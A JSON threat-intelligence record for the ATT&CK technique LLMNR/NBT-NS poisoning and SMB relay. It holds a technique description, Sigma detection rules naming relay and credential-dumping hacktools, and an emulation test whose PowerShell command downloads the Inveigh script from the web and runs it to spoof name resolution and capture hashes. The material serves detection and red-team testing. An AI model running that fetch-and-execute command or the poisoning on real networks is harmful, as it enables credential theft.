{
    "id": "T1557.001",
    "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](T1040) and crack the hashes offline through [Brute Force](T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
    "platforms": "Windows",
    "kill_chain_phases": "Credential Access, Collection",
    "data_sources": "Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification",
    "detection": "Monitor `HKLMSoftwarePoliciesMicrosoftWindows NTDNSClient` for changes to the \"EnableMulticast\" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\nDeploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)",
    "url": "https://attack.mitre.org/techniques/T1557/001",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "4627c6ae-6899-46e2-aa0c-6ebcb1becd19",
                    "bc2e25ed-b92b-4daa-b074-b502bdd1982b",
                    "cd8c163e-a19b-402e-bdd5-419ff5859f12",
                    "4096842a-8f9f-4d36-92b4-d0b2a62f9b2a",
                    "650c784b-7504-4df7-ab2c-4ea882384d1e",
                    "679085d5-f427-4484-9f58-1dc30a7c426d",
                    "16f5d8ca-44bd-47c8-acbe-6fc95a16c12f",
                    "5589ab4f-a767-433c-961d-c91f3f704db1"
                ],
                "lookup_results": [
                    {
                        "uuid": "4627c6ae-6899-46e2-aa0c-6ebcb1becd19",
                        "lookup_data": {
                            "description": "Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/24\ndescription: Detects the execution of different compiled Windows binaries of the impacket\n  toolset (based on names or part of their names - could lead to false positives)\ndetection:\n  condition: selection\n  selection:\n  - Image|contains:\n    - \\goldenPac\n    - \\karmaSMB\n    - \\kintercept\n    - \\ntlmrelayx\n    - \\rpcdump\n    - \\samrdump\n    - \\secretsdump\n    - \\smbexec\n    - \\smbrelayx\n    - \\wmiexec\n    - \\wmipersist\n  - Image|endswith:\n    - \\atexec_windows.exe\n    - \\dcomexec_windows.exe\n    - \\dpapi_windows.exe\n    - \\findDelegation_windows.exe\n    - \\GetADUsers_windows.exe\n    - \\GetNPUsers_windows.exe\n    - \\getPac_windows.exe\n    - \\getST_windows.exe\n    - \\getTGT_windows.exe\n    - \\GetUserSPNs_windows.exe\n    - \\ifmap_windows.exe\n    - \\mimikatz_windows.exe\n    - \\netview_windows.exe\n    - \\nmapAnswerMachine_windows.exe\n    - \\opdump_windows.exe\n    - \\psexec_windows.exe\n    - \\rdp_check_windows.exe\n    - \\sambaPipe_windows.exe\n    - \\smbclient_windows.exe\n    - \\smbserver_windows.exe\n    - \\sniffer_windows.exe\n    - \\sniff_windows.exe\n    - \\split_windows.exe\n    - \\ticketer_windows.exe\nfalsepositives:\n- Legitimate use of the impacket tools\nid: 4627c6ae-6899-46e2-aa0c-6ebcb1becd19\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries\nstatus: test\ntags:\n- attack.execution\n- attack.t1557.001\ntitle: Impacket Tool Execution\n",
                            "sigma:id": "4627c6ae-6899-46e2-aa0c-6ebcb1becd19",
                            "title": "Impacket Tool Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bc2e25ed-b92b-4daa-b074-b502bdd1982b",
                        "lookup_data": {
                            "description": "Detects the invocation of TabTip via CLSID as seen when JuicyPotatoNG is used on a system in brute force mode",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/10/07\ndescription: Detects the invocation of TabTip via CLSID as seen when JuicyPotatoNG\n  is used on a system in brute force mode\ndetection:\n  condition: selection\n  selection:\n    EventID: 10001\n    param1: C:\\Program Files\\Common Files\\microsoft shared\\ink\\TabTip.exe\n    param2: 2147943140\n    param3: '{054AAE20-4BEA-4347-8A35-64A533254A9D}'\nfalsepositives:\n- Unknown\nid: bc2e25ed-b92b-4daa-b074-b502bdd1982b\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/12/04\nreferences:\n- https://github.com/antonioCoco/JuicyPotatoNG\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1557.001\ntitle: Local Privilege Escalation Indicator TabTip\n",
                            "sigma:id": "bc2e25ed-b92b-4daa-b074-b502bdd1982b",
                            "title": "Local Privilege Escalation Indicator TabTip",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cd8c163e-a19b-402e-bdd5-419ff5859f12",
                        "lookup_data": {
                            "description": "Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/31\ndescription: Detects command line parameters used by ADCSPwn, a tool to escalate privileges\n  in an active directory network by coercing authenticate from machine accounts and\n  relaying to the certificate service\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' --adcs '\n    - ' --port '\nfalsepositives:\n- Unlikely\nid: cd8c163e-a19b-402e-bdd5-419ff5859f12\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/bats3c/ADCSPwn\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1557.001\ntitle: ADCSPwn Hack Tool\n",
                            "sigma:id": "cd8c163e-a19b-402e-bdd5-419ff5859f12",
                            "title": "ADCSPwn Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4096842a-8f9f-4d36-92b4-d0b2a62f9b2a",
                        "lookup_data": {
                            "description": "Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam.\nThe usage of this RPC function should be rare if ever used at all.\nThus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate.\n View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..'\n",
                            "raw": "author: '@neu5ron, @Antonlovesdnb, Mike Remen'\ndate: 2021/08/17\ndescription: \"Detects usage of the windows RPC library Encrypting File System Remote\\\n  \\ Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed\\\n  \\ to as PetitPotam.\\nThe usage of this RPC function should be rare if ever used\\\n  \\ at all.\\nThus usage of this function is uncommon enough that any usage of this\\\n  \\ RPC function should warrant further investigation to determine if it is legitimate.\\n\\\n  \\ View surrounding logs (within a few minutes before and after) from the Source\\\n  \\ IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files,\\\n  \\ rdp, ntlm, kerberos, etc..'\\n\"\ndetection:\n  condition: selection\n  selection:\n    operation|startswith: efs\nfalsepositives:\n- Uncommon but legitimate windows administrator or software tasks that make use of\n  the Encrypting File System RPC Calls. Verify if this is common activity (see description).\nfields:\n- id.orig_h\n- id.resp_h\n- id.resp_p\n- operation\n- endpoint\n- named_pipe\n- uid\nid: 4096842a-8f9f-4d36-92b4-d0b2a62f9b2a\nlevel: medium\nlogsource:\n  product: zeek\n  service: dce_rpc\nmodified: 2022/11/28\nreferences:\n- https://github.com/topotam/PetitPotam/blob/d83ac8f2dd34654628c17490f99106eb128e7d1e/PetitPotam/PetitPotam.cpp\n- https://msrc.microsoft.com/update-guide/vulnerability/ADV210003\n- https://vx-underground.org/archive/Symantec/windows-vista-network-attack-07-en.pdf\n- https://threatpost.com/microsoft-petitpotam-poc/168163/\nstatus: test\ntags:\n- attack.t1557.001\n- attack.t1187\ntitle: Potential PetitPotam Attack Via EFS RPC Calls\n",
                            "sigma:id": "4096842a-8f9f-4d36-92b4-d0b2a62f9b2a",
                            "title": "Potential PetitPotam Attack Via EFS RPC Calls",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "650c784b-7504-4df7-ab2c-4ea882384d1e",
                        "lookup_data": {
                            "mitre-attack-id": "T1557.001",
                            "mitre-cti:description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",
                            "mitre-cti:name": "LLMNR/NBT-NS Poisoning and SMB Relay",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'modified': '2022-10-25T15:46:55.393Z', 'name': 'LLMNR/NBT-NS Poisoning and SMB Relay', 'description': 'By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \\n\\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\\n\\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\\n\\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\\xa0\\n\\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}], 'x_mitre_detection': 'Monitor <code>HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\DNSClient</code> for changes to the \"EnableMulticast\" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\\n\\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\\n\\nDeploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)', 'x_mitre_platforms': ['Windows'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.4', 'x_mitre_contributors': ['Eric Kuehn, Secure Ideas', 'Matthew Demaske, Adaptforward', 'Andrew Allen, @whitehat_zero'], 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content', 'Windows Registry: Windows Registry Key Modification', 'Network Traffic: Network Traffic Flow', 'Service: Service Creation'], 'type': 'attack-pattern', 'id': 'attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e', 'created': '2020-02-11T19:08:51.677Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1557/001', 'external_id': 'T1557.001'}, {'source_name': 'Rapid7 LLMNR Spoofer', 'description': 'Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.', 'url': 'https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response'}, {'source_name': 'GitHub Responder', 'description': 'Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.', 'url': 'https://github.com/SpiderLabs/Responder'}, {'source_name': 'Secure Ideas SMB Relay', 'description': 'Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019.', 'url': 'https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html'}, {'source_name': 'TechNet NetBIOS', 'description': 'Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.', 'url': 'https://technet.microsoft.com/library/cc958811.aspx'}, {'source_name': 'GitHub NBNSpoof', 'description': 'Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.', 'url': 'https://github.com/nomex/nbnspoof'}, {'source_name': 'GitHub Conveigh', 'description': 'Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.', 'url': 'https://github.com/Kevin-Robertson/Conveigh'}, {'source_name': 'byt3bl33d3r NTLM Relaying', 'description': 'Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019.', 'url': 'https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html'}, {'source_name': 'Sternsecurity LLMNR-NBTNS', 'description': 'Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.', 'url': 'https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning'}, {'source_name': 'Wikipedia LLMNR', 'description': 'Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.', 'url': 'https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '3.0.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "679085d5-f427-4484-9f58-1dc30a7c426d",
                        "lookup_data": {
                            "description": "Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection package for Windows",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/30\ndescription: Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection\n  package for Windows\ndetection:\n  condition: 1 of selection*\n  selection:\n    ImageLoaded|contains:\n    - \\WinDivert.sys\n    - \\WinDivert64.sys\n    - \\NordDivert.sys\n    - \\lingtiwfp.sys\n    - \\eswfp.sys\n  selection_hashes:\n    Imphash:\n    - 0604bb7cb4bb851e2168d5c7d9399087\n    - 2e5f0e649d97f32b03c09e4686d0574f\n    - 52f8aa269f69f0edad9e8fcdaedce276\n    - c0e5d314da39dbf65a2dbff409cc2c76\n    - 58623490691babe8330adc81cd04a663\n    - 8ee39b48656e4d6b8459d7ba7da7438b\n    - 45ee545ae77e8d43fc70ede9efcd4c96\n    - a1b2e245acd47e4a348e1a552a02859a\n    - 2a5f85fe4609461c6339637594fa9b0a\n    - 6b2c6f95233c2914d1d488ee27531acc\n    - 9f2fdd3f9ab922bbb0560a7df46f4342\n    - d8a719865c448b1bd2ec241e46ac1c88\n    - 0ea54f8c9af4a2fe8367fa457f48ed38\n    - 9d519ae0a0864d6d6ae3f8b6c9c70af6\n    - a74929edfc3289895e3f2885278947ae\n    - a66b476c2d06c370f0a53b5537f2f11e\n    - bdcd836a46bc2415773f6b5ea77a46e4\n    - c28cd6ccd83179e79dac132a553693d9\n  selection_sysmon:\n    Hashes|contains:\n    - IMPHASH=0604bb7cb4bb851e2168d5c7d9399087\n    - IMPHASH=2e5f0e649d97f32b03c09e4686d0574f\n    - IMPHASH=52f8aa269f69f0edad9e8fcdaedce276\n    - IMPHASH=c0e5d314da39dbf65a2dbff409cc2c76\n    - IMPHASH=58623490691babe8330adc81cd04a663\n    - IMPHASH=8ee39b48656e4d6b8459d7ba7da7438b\n    - IMPHASH=45ee545ae77e8d43fc70ede9efcd4c96\n    - IMPHASH=a1b2e245acd47e4a348e1a552a02859a\n    - IMPHASH=2a5f85fe4609461c6339637594fa9b0a\n    - IMPHASH=6b2c6f95233c2914d1d488ee27531acc\n    - IMPHASH=9f2fdd3f9ab922bbb0560a7df46f4342\n    - IMPHASH=d8a719865c448b1bd2ec241e46ac1c88\n    - IMPHASH=0ea54f8c9af4a2fe8367fa457f48ed38\n    - IMPHASH=9d519ae0a0864d6d6ae3f8b6c9c70af6\n    - IMPHASH=a74929edfc3289895e3f2885278947ae\n    - IMPHASH=a66b476c2d06c370f0a53b5537f2f11e\n    - IMPHASH=bdcd836a46bc2415773f6b5ea77a46e4\n    - IMPHASH=c28cd6ccd83179e79dac132a553693d9\nfalsepositives:\n- Legitimate WinDivert driver usage\nid: 679085d5-f427-4484-9f58-1dc30a7c426d\nlevel: high\nlogsource:\n  category: driver_load\n  product: windows\nmodified: 2022/11/19\nreferences:\n- https://reqrypt.org/windivert-doc.html\n- https://rastamouse.me/ntlm-relaying-via-cobalt-strike/\nstatus: experimental\ntags:\n- attack.collection\n- attack.defense_evasion\n- attack.t1599.001\n- attack.t1557.001\ntitle: WinDivert Driver Load\n",
                            "sigma:id": "679085d5-f427-4484-9f58-1dc30a7c426d",
                            "title": "WinDivert Driver Load",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "16f5d8ca-44bd-47c8-acbe-6fc95a16c12f",
                        "lookup_data": {
                            "description": "Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like",
                            "raw": "author: '@SBousseaden, Florian Roth'\ndate: 2019/11/15\ndescription: Detects logon events that have characteristics of events generated during\n  an attack with RottenPotato and the like\ndetection:\n  condition: selection\n  selection:\n    EventID: 4624\n    IpAddress:\n    - 127.0.0.1\n    - ::1\n    LogonType: 3\n    TargetUserName: ANONYMOUS LOGON\n    WorkstationName: '-'\nfalsepositives:\n- Unknown\nid: 16f5d8ca-44bd-47c8-acbe-6fc95a16c12f\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/12/22\nreferences:\n- https://twitter.com/SBousseaden/status/1195284233729777665\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.credential_access\n- attack.t1557.001\ntitle: RottenPotato Like Attack Pattern\n",
                            "sigma:id": "16f5d8ca-44bd-47c8-acbe-6fc95a16c12f",
                            "title": "RottenPotato Like Attack Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5589ab4f-a767-433c-961d-c91f3f704db1",
                        "lookup_data": {
                            "description": "Detects different hacktools used for relay attacks on Windows for privilege escalation",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/24\ndescription: Detects different hacktools used for relay attacks on Windows for privilege\n  escalation\ndetection:\n  condition: 1 of selection_* and not 1 of filter_*\n  filter_hotpotatoes:\n    Image|contains:\n    - HotPotatoes6\n    - HotPotatoes7\n    - 'HotPotatoes '\n  selection_juicypotato_enum:\n    CommandLine|contains: .exe -c \"{\n    CommandLine|endswith: '}\" -z'\n  selection_pe:\n    Image|contains:\n    - PetitPotam\n    - RottenPotato\n    - HotPotato\n    - JuicyPotato\n    - \\just_dce_\n    - Juicy Potato\n    - \\temp\\rot.exe\n    - \\Potato.exe\n    - \\SpoolSample.exe\n    - \\Responder.exe\n    - \\smbrelayx\n    - \\ntlmrelayx\n    - \\LocalPotato\n  selection_script:\n    CommandLine|contains:\n    - Invoke-Tater\n    - ' smbrelay'\n    - ' ntlmrelay'\n    - 'cme smb '\n    - ' /ntlm:NTLMhash '\n    - Invoke-PetitPotam\n    - '.exe -t * -p '\nfalsepositives:\n- Legitimate files with these rare hacktool names\nid: 5589ab4f-a767-433c-961d-c91f3f704db1\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/12\nreferences:\n- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\n- https://pentestlab.blog/2017/04/13/hot-potato/\n- https://github.com/ohpe/juicy-potato\n- https://hunter2.gitbook.io/darthsidious/other/war-stories/domain-admin-in-30-minutes\n- https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire\n- https://www.localpotato.com/\nstatus: test\ntags:\n- attack.execution\n- attack.t1557.001\ntitle: SMB Relay Attack Tools\n",
                            "sigma:id": "5589ab4f-a767-433c-961d-c91f3f704db1",
                            "title": "SMB Relay Attack Tools",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1557.001",
                "display_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
                "atomic_tests": [
                    {
                        "name": "LLMNR Poisoning with Inveigh (PowerShell)",
                        "auto_generated_guid": "deecd55f-afe0-4a62-9fba-4d1ba2deb321",
                        "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 16:24:26"
}